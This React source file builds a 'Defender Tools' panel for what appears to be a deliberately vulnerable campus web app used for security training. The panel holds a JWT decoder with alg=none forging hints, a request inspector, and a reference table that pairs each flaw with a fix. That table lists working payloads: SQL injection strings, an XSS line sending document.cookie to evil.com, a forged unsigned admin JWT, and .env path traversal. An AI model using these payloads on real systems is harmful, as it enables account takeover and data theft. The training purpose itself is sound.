"use client";
import React, { useState } from "react";
import type { LogEntry, AttackType } from "@/types/defense";
import { mono, sans, TYPE_LABELS } from "@/constants/campusTheme";
import { KeyRound, Activity, BookOpen, Lightbulb, Zap, Unlock } from "lucide-react";

type Props = { logs: LogEntry[] };

// ── JWT Decoder ───────────────────────────────────────────────────────────────
function JwtDecoder() {
  const [input, setInput] = useState("");
  const [result, setResult] = useState<{ header: any; payload: any; warnings: string[]; raw: string[] } | null>(null);
  const [err, setErr] = useState("");

  function decode() {
    setErr(""); setResult(null);
    const parts = input.trim().split(".");
    if (parts.length < 2) { setErr("Not a valid JWT — expected at least 2 dot-separated parts."); return; }
    try {
      const pad = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
      const decodeB64 = (s: string) => JSON.parse(atob(pad(s.replace(/-/g, "+").replace(/_/g, "/"))));
      const header = decodeB64(parts[0]);
      const payload = decodeB64(parts[1]);
      const warnings: string[] = [];
      if (header.alg === "none") warnings.push("🚨 alg=none — signature skipped entirely. Anyone can forge this token.");
      if (!parts[2]) warnings.push("🚨 No signature present — classic alg=none bypass.");
      if (!payload.exp) warnings.push("⚠️ No expiry (exp) — token lives forever.");
      if (payload.exp && payload.exp < Date.now() / 1000) warnings.push("⚠️ Token EXPIRED at " + new Date(payload.exp * 1000).toLocaleString());
      if (payload.role === "admin") warnings.push("🔑 role=admin — verify this token is legitimate.");
      if (payload.role === "student") warnings.push("💡 role=student — try forging with role=admin via alg=none.");
      setResult({ header, payload, warnings, raw: parts });
    } catch { setErr("Could not decode — check it is a valid Base64URL JWT."); }
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
      {/* Input card */}
      <div style={{ background: "linear-gradient(135deg, #0f172a 0%, #1e293b 100%)", border: "1px solid rgba(99,102,241,0.2)", borderRadius: 14, padding: 20 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <div style={{ width: 8, height: 8, borderRadius: "50%", background: "#6366f1", boxShadow: "0 0 8px #6366f1" }} />
          <span style={{ fontSize: 11, fontWeight: 700, color: "#818cf8", letterSpacing: ".1em" }}>INPUT — PASTE JWT</span>
        </div>
        <textarea
          value={input} onChange={e => setInput(e.target.value)}
          placeholder={"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."}
          spellCheck={false} rows={4}
          style={{ width: "100%", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 8, padding: "12px 14px", color: "#a5b4fc", fontFamily: mono, fontSize: 12.5, lineHeight: 1.7, resize: "vertical", outline: "none", boxSizing: "border-box" }}
        />
        <button onClick={decode} style={{ marginTop: 12, padding: "10px 24px", background: "linear-gradient(135deg, #6366f1, #4f46e5)", border: "none", borderRadius: 8, color: "#fff", fontSize: 12, fontWeight: 700, cursor: "pointer", fontFamily: sans, letterSpacing: ".05em", boxShadow: "0 4px 15px rgba(99,102,241,0.35)", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
          <Unlock size={14} /> DECODE TOKEN
        </button>
      </div>

      {err && <div style={{ fontSize: 12, color: "#f87171", background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.25)", borderRadius: 10, padding: "12px 16px" }}>{err}</div>}

      {result && (
        <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          {/* Warnings */}
          {result.warnings.length > 0 && (
            <div style={{ background: "linear-gradient(135deg, rgba(239,68,68,0.08), rgba(239,68,68,0.03))", border: "1px solid rgba(239,68,68,0.25)", borderRadius: 12, overflow: "hidden" }}>
              <div style={{ padding: "10px 16px", borderBottom: "1px solid rgba(239,68,68,0.15)", display: "flex", alignItems: "center", gap: 8 }}>
                <Zap size={14} color="#f87171" />
                <span style={{ fontSize: 10, fontWeight: 800, color: "#f87171", letterSpacing: ".12em" }}>SECURITY FINDINGS ({result.warnings.length})</span>
              </div>
              <div style={{ padding: "12px 16px", display: "flex", flexDirection: "column", gap: 8 }}>
                {result.warnings.map((w, i) => (
                  <div key={i} style={{ fontSize: 12.5, color: "#fca5a5", lineHeight: 1.55, display: "flex", gap: 8 }}>
                    <span style={{ flexShrink: 0 }}>›</span>{w}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Header + Payload grid */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
            {[["HEADER", result.header, "#6366f1"], ["PAYLOAD", result.payload, "#10b981"]].map(([label, obj, accent]) => (
              <div key={label as string} style={{ background: "#0f172a", border: `1px solid ${accent as string}33`, borderRadius: 12, overflow: "hidden" }}>
                <div style={{ padding: "8px 14px", borderBottom: `1px solid ${accent as string}22`, background: `${accent as string}11`, display: "flex", alignItems: "center", gap: 6 }}>
                  <div style={{ width: 6, height: 6, borderRadius: "50%", background: accent as string }} />
                  <span style={{ fontSize: 9, fontWeight: 800, color: accent as string, letterSpacing: ".12em" }}>{label as string}</span>
                </div>
                <pre style={{ margin: 0, padding: "14px", fontFamily: mono, fontSize: 12.5, color: "#86efac", lineHeight: 1.75, whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
                  {JSON.stringify(obj, null, 2)}
                </pre>
              </div>
            ))}
          </div>

          {/* Signature */}
          <div style={{ background: "#0f172a", border: `1px solid ${result.raw[2] ? "rgba(251,191,36,0.25)" : "rgba(239,68,68,0.25)"}`, borderRadius: 12, overflow: "hidden" }}>
            <div style={{ padding: "8px 14px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 6 }}>
              <div style={{ width: 6, height: 6, borderRadius: "50%", background: result.raw[2] ? "#fbbf24" : "#ef4444" }} />
              <span style={{ fontSize: 9, fontWeight: 800, color: result.raw[2] ? "#fbbf24" : "#f87171", letterSpacing: ".12em" }}>SIGNATURE</span>
              {!result.raw[2] && <span style={{ marginLeft: "auto", fontSize: 9, fontWeight: 800, color: "#f87171", background: "rgba(239,68,68,0.15)", padding: "2px 7px", borderRadius: 4 }}>MISSING — FORGEABLE</span>}
            </div>
            <div style={{ padding: "12px 14px", fontFamily: mono, fontSize: 12, color: result.raw[2] ? "#fbbf24" : "#f87171", wordBreak: "break-all" }}>
              {result.raw[2] ?? "⚠️ No signature — this token will be accepted by servers that allow alg=none"}
            </div>
          </div>

          {/* Forge hint */}
          <div style={{ background: "rgba(99,102,241,0.06)", border: "1px solid rgba(99,102,241,0.2)", borderRadius: 10, padding: "12px 16px", fontSize: 12, color: "#a5b4fc", lineHeight: 1.65, display: "flex", gap: 8, alignItems: "flex-start" }}>
            <Lightbulb size={16} style={{ flexShrink: 0, marginTop: 2 }} />
            <div>
              <strong>To forge an admin token:</strong> Set <code style={{ fontFamily: mono, background: "rgba(99,102,241,0.15)", padding: "1px 5px", borderRadius: 3 }}>alg=none</code>, change <code style={{ fontFamily: mono, background: "rgba(99,102,241,0.15)", padding: "1px 5px", borderRadius: 3 }}>role=admin</code>, re-encode both parts, and drop the signature. Try the live lab at <code style={{ fontFamily: mono, background: "rgba(99,102,241,0.15)", padding: "1px 5px", borderRadius: 3 }}>/jwt-debug</code>.
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Request Inspector ─────────────────────────────────────────────────────────
function RequestInspector({ logs }: { logs: LogEntry[] }) {
  const [selected, setSelected] = useState<string | null>(null);
  const log = logs.find(l => l.id === selected);
  const recent = logs.slice(0, 40);

  const METHOD_COLOR: Record<string, { bg: string; text: string }> = {
    GET:    { bg: "rgba(34,197,94,0.12)",  text: "#4ade80" },
    POST:   { bg: "rgba(245,130,10,0.12)", text: "#f5820a" },
    PUT:    { bg: "rgba(99,102,241,0.12)", text: "#a5b4fc" },
    DELETE: { bg: "rgba(239,68,68,0.12)",  text: "#f87171" },
  };

  return (
    <div style={{ display: "flex", gap: 0, height: 500, background: "#0d1117", borderRadius: 14, overflow: "hidden", border: "1px solid rgba(255,255,255,0.08)" }}>
      {/* List */}
      <div style={{ width: 290, flexShrink: 0, borderRight: "1px solid rgba(255,255,255,0.06)", display: "flex", flexDirection: "column" }}>
        <div style={{ padding: "10px 14px", borderBottom: "1px solid rgba(255,255,255,0.06)", background: "#161b22", display: "flex", alignItems: "center", gap: 8 }}>
          <div style={{ width: 7, height: 7, borderRadius: "50%", background: "#22c55e", animation: "pulse 1.5s infinite" }} />
          <span style={{ fontSize: 10, fontWeight: 700, color: "#4b5563", letterSpacing: ".12em" }}>LIVE FEED ({recent.length})</span>
        </div>
        <div style={{ flex: 1, overflowY: "auto" }}>
          {recent.length === 0 ? (
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", height: "100%", fontSize: 11, color: "#374151" }}>Waiting for attacks...</div>
          ) : recent.map(l => {
            const mc = METHOD_COLOR[l.method] ?? { bg: "rgba(255,255,255,0.05)", text: "#94a3b8" };
            const isActive = selected === l.id;
            return (
              <button key={l.id} onClick={() => setSelected(l.id)} style={{
                width: "100%", textAlign: "left", padding: "9px 12px",
                background: isActive ? "rgba(245,130,10,0.08)" : "transparent",
                border: "none", borderBottom: "1px solid rgba(255,255,255,0.04)",
                borderLeft: `3px solid ${isActive ? "#f5820a" : "transparent"}`,
                cursor: "pointer", transition: "all .1s",
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 3 }}>
                  <span style={{ fontSize: 9, fontWeight: 800, fontFamily: mono, background: mc.bg, color: mc.text, padding: "2px 6px", borderRadius: 4, minWidth: 36, textAlign: "center" }}>{l.method}</span>
                  <span style={{ fontSize: 11, fontFamily: mono, color: isActive ? "#f5820a" : "#c9d1d9", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 170 }}>{l.endpoint}</span>
                </div>
                <div style={{ fontSize: 10, color: "#4b5563" }}>{new Date(l.ts).toLocaleTimeString()} · {l.ip}</div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Detail */}
      {log ? (
        <div style={{ flex: 1, display: "flex", flexDirection: "column", minWidth: 0 }}>
          <div style={{ padding: "10px 18px", background: "#161b22", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "#4b5563", letterSpacing: ".1em" }}>RAW HTTP REQUEST</span>
            <span style={{ marginLeft: "auto", fontSize: 10, fontFamily: mono, color: "#f5820a" }}>{log.ip}:{(log as any).port ?? 3000}</span>
          </div>
          <pre style={{ flex: 1, margin: 0, padding: "16px 20px", fontFamily: mono, fontSize: 12.5, color: "#94a3b8", lineHeight: 1.8, overflowY: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
            <span style={{ color: "#60a5fa", fontWeight: 800 }}>{log.method}</span>{" "}
            <span style={{ color: "#fbbf24" }}>{log.endpoint}</span>{" HTTP/1.1\n"}
            <span style={{ color: "#4b5563" }}>Host: </span><span style={{ color: "#c9d1d9" }}>localhost:3000{"\n"}</span>
            <span style={{ color: "#4b5563" }}>User-Agent: </span><span style={{ color: "#c9d1d9" }}>{log.userAgent}{"\n"}</span>
            <span style={{ color: "#4b5563" }}>Accept: </span><span style={{ color: "#c9d1d9" }}>application/json{"\n"}</span>
            <span style={{ color: "#4b5563" }}>Content-Type: </span><span style={{ color: "#c9d1d9" }}>application/json{"\n"}</span>
            <span style={{ color: "#4b5563" }}>X-Forwarded-For: </span><span style={{ color: "#f87171", fontWeight: 700 }}>{log.ip}{"\n"}</span>
            <span style={{ color: "#4b5563" }}>Authorization: </span><span style={{ color: "#94a3b8" }}>Bearer eyJhbGci... (truncated){"\n"}</span>
            <span style={{ color: "#4b5563" }}>Connection: </span><span style={{ color: "#c9d1d9" }}>keep-alive{"\n"}</span>
            {log.payload && <>{"\n"}<span style={{ color: "#4ade80", fontWeight: 700 }}>{log.payload}</span></>}
          </pre>
          <div style={{ padding: "12px 18px", background: "#161b22", borderTop: "1px solid rgba(255,255,255,0.06)" }}>
            <div style={{ fontSize: 9, fontWeight: 800, color: "#4b5563", letterSpacing: ".12em", marginBottom: 6 }}>ATTACK DETAIL</div>
            <div style={{ fontSize: 12, color: "#94a3b8", lineHeight: 1.6 }}>{log.detail}</div>
          </div>
        </div>
      ) : (
        <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 12 }}>
          <Activity size={48} color="#374151" opacity={0.3} />
          <div style={{ fontSize: 11, color: "#374151", fontWeight: 700, letterSpacing: ".1em" }}>SELECT A REQUEST</div>
          <div style={{ fontSize: 11, color: "#1f2937" }}>Click any entry from the feed to inspect</div>
        </div>
      )}
    </div>
  );
}

// ── Quick Reference ───────────────────────────────────────────────────────────
const QUICK_REF: { type: AttackType; severity: string; sevColor: string; fix: string; detect: string; example: string }[] = [
  { type: "sqli_login",    severity: "CRITICAL", sevColor: "#ef4444", fix: "db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(u, p)", detect: "Login with admin'-- → 200 + JWT returned despite wrong password", example: "username=admin'--&password=x" },
  { type: "sqli_search",   severity: "HIGH",     sevColor: "#f97316", fix: "db.prepare('...WHERE full_name LIKE ?').all('%'+q+'%')", detect: "%' UNION SELECT 1,2,3-- → extra rows returned in search results", example: "%' UNION SELECT flag_value,flag_name,3,4,5 FROM flags--" },
  { type: "xss_notices",   severity: "HIGH",     sevColor: "#f97316", fix: "Replace dangerouslySetInnerHTML → use {notice.title} plain JSX", detect: "<script>alert(1)</script> in notice title → script fires on /notices", example: "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>" },
  { type: "jwt_forge",     severity: "CRITICAL", sevColor: "#ef4444", fix: "jwt.verify(token, SECRET, { algorithms: ['HS256'] })", detect: "Set alg=none, drop signature → still authenticated as admin", example: "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." },
  { type: "idor_profile",  severity: "HIGH",     sevColor: "#f97316", fix: "if (tokenUser.id !== Number(id) && tokenUser.role==='student') return 403", detect: "GET /api/profile/1 as student → returns admin's full profile", example: "GET /api/profile/1 (logged in as student ID=5)" },
  { type: "lfi_documents", severity: "HIGH",     sevColor: "#f97316", fix: "const safeFile = path.basename(file); path.join(root, safeFile)", detect: "?file=../../../../.env → returns raw .env contents", example: "?file=../../../../.env" },
  { type: "open_redirect", severity: "MEDIUM",   sevColor: "#eab308", fix: "const safe = next?.startsWith('/') ? next : '/dashboard'", detect: "?next=https://evil.com → redirect to external domain after login", example: "/login?next=https://phishing.example.com" },
  { type: "recon",         severity: "MEDIUM",   sevColor: "#eab308", fix: "Remove HTML comments. Delete /api/env-file route.", detect: "View source → <!-- Emergency: admin / Admin@Campus2025 --> visible", example: "curl http://localhost:3000 | grep -i 'admin\\|secret\\|flag'" },
];

function QuickRef() {
  const [expanded, setExpanded] = useState<AttackType | null>(null);
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {QUICK_REF.map(item => {
        const isOpen = expanded === item.type;
        return (
          <div key={item.type} style={{ border: `1px solid ${isOpen ? item.sevColor + "33" : "rgba(255,255,255,0.07)"}`, borderRadius: 12, overflow: "hidden", background: isOpen ? "#0f172a" : "#0d1117", transition: "all .15s" }}>
            <button onClick={() => setExpanded(isOpen ? null : item.type)} style={{ width: "100%", textAlign: "left", padding: "13px 16px", background: "transparent", border: "none", cursor: "pointer", display: "flex", alignItems: "center", gap: 10, fontFamily: sans }}>
              <span style={{ fontSize: 12, color: "#4b5563", transition: "transform .15s", display: "inline-block", transform: isOpen ? "rotate(90deg)" : "rotate(0deg)" }}>▶</span>
              <span style={{ fontSize: 13, fontWeight: 700, color: isOpen ? "#e2e8f0" : "#94a3b8", flex: 1 }}>{TYPE_LABELS[item.type]}</span>
              <span style={{ fontSize: 9, fontWeight: 800, padding: "3px 8px", borderRadius: 5, background: `${item.sevColor}18`, color: item.sevColor, border: `1px solid ${item.sevColor}30` }}>{item.severity}</span>
            </button>
            {isOpen && (
              <div style={{ padding: "0 16px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
                {([
                  ["🔴 DETECTION / EXPLOIT", item.detect, "rgba(239,68,68,0.06)", "rgba(239,68,68,0.2)", "#f87171"],
                  ["✅ SECURE FIX", item.fix, "rgba(34,197,94,0.06)", "rgba(34,197,94,0.2)", "#4ade80"],
                  ["💻 EXAMPLE PAYLOAD", item.example, "rgba(99,102,241,0.06)", "rgba(99,102,241,0.2)", "#a5b4fc"],
                ] as [string, string, string, string, string][]).map(([label, content, bg, border, color]) => (
                  <div key={label} style={{ background: bg, border: `1px solid ${border}`, borderRadius: 8, padding: "10px 14px" }}>
                    <div style={{ fontSize: 9, fontWeight: 800, color, letterSpacing: ".1em", marginBottom: 6 }}>{label}</div>
                    <code style={{ fontSize: 12, fontFamily: mono, color: "#c9d1d9", lineHeight: 1.65, display: "block", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{content}</code>
                  </div>
                ))}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ── Main ──────────────────────────────────────────────────────────────────────
type Tool = "jwt" | "requests" | "reference";

const TOOLS: { id: Tool; icon: React.ReactNode; label: string; desc: string; accent: string }[] = [
  { id: "jwt",       icon: <KeyRound size={20} />, label: "JWT Decoder",     desc: "Decode & analyze tokens for weaknesses",     accent: "#6366f1" },
  { id: "requests",  icon: <Activity size={20} />, label: "Request Log",     desc: "Inspect raw HTTP attack requests",            accent: "#f5820a" },
  { id: "reference", icon: <BookOpen size={20} />, label: "Quick Reference", desc: "Detect, exploit & fix each vulnerability",    accent: "#10b981" },
];

export function ToolsTab({ logs }: Props) {
  const [activeTool, setActiveTool] = useState<Tool>("jwt");
  const active = TOOLS.find(t => t.id === activeTool)!;

  const HEADINGS: Record<Tool, { title: string; sub: string }> = {
    jwt:       { title: "JWT Token Decoder", sub: "Paste any token intercepted from DevTools → Application → Cookies to decode and audit it." },
    requests:  { title: "HTTP Request Inspector", sub: "Select an attack log entry to reconstruct the full raw HTTP request with headers and payload." },
    reference: { title: "Vulnerability Reference", sub: "How each attack works, how to detect it, and the exact code fix to patch it." },
  };

  return (
    <div style={{ flex: 1, display: "flex", minHeight: 0, background: "#010409" }}>

      {/* Sidebar */}
      <div style={{ width: 230, flexShrink: 0, borderRight: "1px solid rgba(255,255,255,0.06)", display: "flex", flexDirection: "column", background: "#0d1117" }}>
        <div style={{ padding: "16px 16px 12px", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
          <div style={{ fontSize: 9, fontWeight: 800, color: "#374151", letterSpacing: ".18em", marginBottom: 4 }}>DEFENDER TOOLS</div>
          <div style={{ fontSize: 11, color: "#4b5563" }}>Interactive security utilities</div>
        </div>
        <div style={{ padding: "10px 8px", flex: 1 }}>
          {TOOLS.map(tool => {
            const isActive = activeTool === tool.id;
            return (
              <button key={tool.id} onClick={() => setActiveTool(tool.id)} style={{
                width: "100%", textAlign: "left", padding: "11px 12px", marginBottom: 4,
                borderRadius: 10, border: isActive ? `1px solid ${tool.accent}33` : "1px solid transparent",
                background: isActive ? `${tool.accent}0d` : "transparent",
                cursor: "pointer", fontFamily: sans, transition: "all .15s",
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: 9, marginBottom: 3 }}>
                  <span style={{ display: "flex", alignItems: "center" }}>{tool.icon}</span>
                  <span style={{ fontSize: 12, fontWeight: 700, color: isActive ? tool.accent : "#64748b" }}>{tool.label}</span>
                </div>
                <div style={{ fontSize: 10, color: "#374151", lineHeight: 1.5, paddingLeft: 27 }}>{tool.desc}</div>
                {isActive && <div style={{ marginTop: 6, marginLeft: 27, height: 2, borderRadius: 1, background: `linear-gradient(90deg, ${tool.accent}, transparent)` }} />}
              </button>
            );
          })}
        </div>
        <div style={{ padding: "12px 14px", borderTop: "1px solid rgba(255,255,255,0.06)", fontSize: 10, color: "#374151", lineHeight: 1.65, display: "flex", gap: 6, alignItems: "flex-start" }}>
          <Lightbulb size={12} style={{ flexShrink: 0, marginTop: 1, color: "#4b5563" }} />
          <span>Use these in parallel with the Live Logs tab to analyze attacks in real time.</span>
        </div>
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflowY: "auto", display: "flex", flexDirection: "column" }}>
        {/* Header */}
        <div style={{ padding: "24px 32px 0", flexShrink: 0 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 8 }}>
            <div style={{ width: 3, height: 28, borderRadius: 2, background: active.accent }} />
            <h2 style={{ margin: 0, fontSize: 20, fontWeight: 800, color: "#e2e8f0" }}>{HEADINGS[activeTool].title}</h2>
          </div>
          <p style={{ margin: "0 0 24px 15px", fontSize: 13, color: "#4b5563", lineHeight: 1.65 }}>{HEADINGS[activeTool].sub}</p>
        </div>
        <div style={{ padding: "0 32px 32px" }}>
          {activeTool === "jwt"       && <JwtDecoder />}
          {activeTool === "requests"  && <RequestInspector logs={logs} />}
          {activeTool === "reference" && <QuickRef />}
        </div>
      </div>

      <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }`}</style>
    </div>
  );
}
